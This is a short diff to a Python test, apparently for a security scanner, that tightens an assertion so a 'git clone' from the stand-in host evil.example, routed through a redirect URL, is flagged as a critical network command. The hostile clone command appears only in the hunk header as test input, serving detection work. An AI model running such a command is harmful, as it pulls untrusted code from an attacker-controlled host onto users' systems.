@@ -1084,8 +1084,9 @@ git clone https://evil.example/redirect?next=https://github.com/example-org/mode
 
     assert any(
         check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        and check.details.get("type") == "network_command"
+        and check.details.get("command_type") == "git_clone"
+        and check.severity == IssueSeverity.CRITICAL
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
